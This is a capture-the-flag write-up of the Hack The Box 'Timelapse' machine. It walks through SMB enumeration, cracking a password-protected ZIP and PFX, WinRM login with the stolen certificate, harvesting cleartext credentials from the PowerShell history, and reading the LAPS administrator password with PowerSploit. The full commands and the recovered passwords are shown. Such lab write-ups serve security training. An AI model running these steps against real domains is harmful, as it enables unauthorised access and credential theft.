# Timelapse Machine

## Service Enumeration

To begin with, I start scanning all the ports on the target to obtain an overall picture of the target. For this I use following command ```sudo nmap -Pn -p- --min-rate 1000 -v timelapse.htb```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/9306bd81-6e7e-4e56-90ae-73367c7f810e)

Once the open ports are known, I began the service enumeration process. In order to do this, nmap tool was used and, specifically the following command: ```sudo nmap -sS -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49673,49674,64088 --min-rate 1000 -oN timelapseServiceVersions timelapse.htb```


![image](https://github.com/0xCOrS/WriteUps/assets/97627828/73645148-c9f9-402c-8983-dd6849c76d04)

### DNS Enumeration
As port 53 is open, I will try to enumerate subdomains and DNS related information.
Using dig tool I try to recover any entry with ```dig any timelapse.htb @10.10.11.152```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/99177a6a-8c9e-4d76-b70b-30eb42be896e)

As it is shown on the picture, a new subdomain appears (dc01.timelapse.htb) which seems to be an Active Directory Domain Controller.

### LDAP Enumeration

Using python console, I will try to manually obtain LDAP useful information as the naming con-text. 

```

$$ server = ldap3.Server('10.10.11.152', get_info = ldap3.ALL, port = 389, use_ssl = False)      
$$ connection = ldap3.Connection(server)      
$$ connection.bind()
>>True                                                                                                                
$$ server.info

```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/6e1c0c7b-8409-474b-8e65-e89b203b63bd)

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/80c4b8fa-ed9f-42d5-a697-fabe4bcb6702)

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/4f3f8bbe-f81c-497c-a9e9-9d834794aff7)

As intended, naming context was obtained being the default naming context: “DC=timelapse, DC=htb”. However, naming context is not the only piece of information recovered. It was also known the server time (useful for requesting Kerberos Tickets), and the LDAP name of the Domain Controller ```CN=DC01, CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb```

### SMB Enumeration

“Crackmapexec” tool will allow to check whether there are publicly accessible shares or aren’t. With this goal, command ```crackmapexec smb timelapse.htb -d timelapse.htb -u 'test' -p '' –shares``` will show (if possible) shared folders and which permissions does “test” user have on each one (during the tests it was learnt that null sessions are also available on this machine). 

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/04d93ec4-8611-4213-8038-85448355a15f)

As seen in the previous picture, an interesting share called “Share” has been listed. User test has read access in this share.
Next step is to try and spider the share using as pattern “.” This way, almost every file will be listed. In order to do this command ```crackmapexec smb timelapse.htb -d timelapse.htb -u 'test' -p '' --spider Shares --pattern . ```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/7cf07d0b-9324-4c68-9dba-5fa9a9378ae1)

Interesting files have appeared. In order to retrieve the files and have a better interaction with the target SMB, “smbclient” tool will be used. As null sessions are allowed, command used will be ```smbclient \\\\10.10.11.152\\Shares```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/42827fc6-2e79-4586-ba94-5d052a1ae38c)

To download everything easier recurse mode is activated using “recurse” smb command. After that both folders are downloaded using ```mget <folder-name>” command```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/495fd680-e6dd-4148-89d2-ce7bda681ab8)

Inspecting the recently downloaded files, one of them stands out because of the name “winrm_backup.zip” and because it contains a “.PFX” certificate file. When trying to unzip it, it is learnt that it is password-protected. To break the protection next steps were followed:

1. Extract the hash of the password using ```zip2john winrm*```

2. Export the hash to a file called “hash.txt” (only the string between $pkzip$ and $/pkzip$ as it is the format that hashcat uses).

3. Perform dictionary attack using hashcat with command ```.\hashcat -m 17200 -a 0 hash.txt rockyou.txt```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/283df843-6aa5-4e3d-a4b5-fd4a0b1adc88)

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/f049f4ba-3f61-4c7e-b11a-6e897634caae)

As seen in the picture, ZIP password was recovered, and it is “supremelegacy”. 

After extracting the file inside the ZIP “legacy_dev_auth.pfx” it is known that it is also password-protected.

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/a023b07c-f783-44ee-8c24-aa7c2d2e5770)

## Initial Access - Insecure Credentials

**Vulnerability Explanation**: Among the files found on the publicly accessible SMB shares, a password-protected ZIP file was found containing an also password-protected “.PFX” certificate file. Both passwords were found with a dictionary and performing a dictionary attack.

**Vulnerability Fix**: Avoid using easy passwords.

**Severity**: Critical

**Steps to reproduce the attack**: 

1.	Donwload the pfx file password cracking from github “https://github.com/crackpkcs12/crackpkcs12”

2.	Launch the dictionary attack using ```crackpkcs12 -d <dictionary-file> <pfx-file> -t <num-ber-of-threads>```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/f3015451-3172-4e86-9c02-964010ed8af6)

3.	Using the password, extract the private key file and certificate from the pfx file using following two commands:

```

openssl pkcs12 -in ../lega*pfx -out timelapse-legacy.cert.pem -clcerts -nokeys
openssl pkcs12 -in ../lega*pfx -out timelapse-legacy.key.pem -nocerts -nodes
	
```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/9acf8b9a-ea05-424e-8cbd-7c41490d3d2c)

4.	Using the recently obtained files, authenticate using ```evil-winrm -i 10.10.11.152 -c Dev/certs/timelapse-legacy.cert.pem -k Dev/certs/timelapse-legacy.key.pem -u legacyy -S```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/ff8e7ade-cb11-4b00-8cec-f3816151712e)

5.	Grab “C.\Users\Legacyy\Desktop\User.txt”

## Post-Exploitation

Once logged in as “legacyy”, exploring the command line history file ```$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt``` cleartext credentials are found for user “svc_deploy”.

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/a49f93a9-19b3-4acf-9056-73e194013120)

Using those credentials ```Svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV```, it is possible to log in as “svc_deploy” through winrm.

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/01b7061a-f10a-4b1c-8957-7db0c824152a)

## Privilege Escalation - LAPS_Reader Group

**Vulnerability Explanation**: after logging in as svc_deploy with recently found cleartext creden-tials, it is found that this user is a member of the LAPS_reader group. Members of this group are allowed to access the Local Administrator password from the “ms-mcs-admpwd” attribute of computer’s domain object.

**Vulnerability Fix**: securely store credentials.

**Severity**: Critical

**Steps to reproduce the attack**: after logging in as a “LAPS_reader” group member, using cmdlet ```get-domaincomputer``` from “PowerSploit.ps1” (https://github.com/PowerShellMafia/PowerSploit) extract the ms-mcs-admpwd with the following command ```get-domaincomputer | where-object { $_.’ms-mcs-admpwd’ -ne $null } | select-object ms-mcs-admpwd```

![image](https://github.com/0xCOrS/WriteUps/assets/97627828/3711ba51-dd53-4914-8cbb-174751a4f8db)

As shown in the previous picture, credentials are recovered ```Yln0l#3M+,705uQP9g(nSq8+```

After that, login as Administrator and grab the flag.













